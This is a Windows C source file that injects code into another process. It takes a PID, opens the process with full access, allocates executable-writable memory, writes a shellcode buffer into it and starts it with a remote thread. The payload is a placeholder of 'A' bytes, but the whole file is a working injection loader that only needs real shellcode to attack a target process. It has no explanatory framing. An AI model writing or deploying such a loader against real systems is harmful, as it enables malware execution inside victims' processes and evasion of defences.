#include <windows.h>
#include <stdio.h>

const char* k = "[+]";
const char* i = "[+]";
const char* e = "[+]";

DWORD PID, TID = NULL;
LPVOID rBuffer = NULL;
HANDLE hProcess, hThread = NULL;

unsigned char crowPuke[] = "\x41\x41\x41\x41\x41\x41\x41\x41";

int main(int argc, char* argv[]) {

if (argc < 2) {
    printf("%s usage: program.exe <PID>", e);
    return EXIT_FAILURE;

}
    PID = atoi(argv[1]);
    printf("%s trying to open a handle to process (%ld)\n", i, PID);
    
    /* open a handle to the process*/    
    hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, PID);
    printf("%s got a handle to the process!\n\\---0x%p", k, hProcess);

    if (hProcess == NULL) {
        printf("%s couldn't get a handle to the process (%ld), error: %ld", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    /*allocate bytes to process memory*/
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(crowPuke), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE permissions\n", k, sizeof(crowPuke));

    /* allocate write that allocated memory to the process memory */
    WriteProcessMemory(hProcess, rBuffer, crowPuke, sizeof(crowPuke), NULL);
    printf("%s wrote %zu-bytes to process memory\n", k, sizeof(crowPuke));

    /* create thread to run the payload */
    hThread = CreateRemoteThreadEx(hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		0,
		&TID);

    if (hThread == NULL) {
        printf("%s failed to get a handle to the thread, error: %ld", e, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", k, TID, hThread);

    printf("%s waiting for thread to finish\n", i);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s thread finished\n", k);



    printf("%s cleaning up\n", i);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    printf("%s finished! see you next time :>\n", k);

    return EXIT_SUCCESS;
}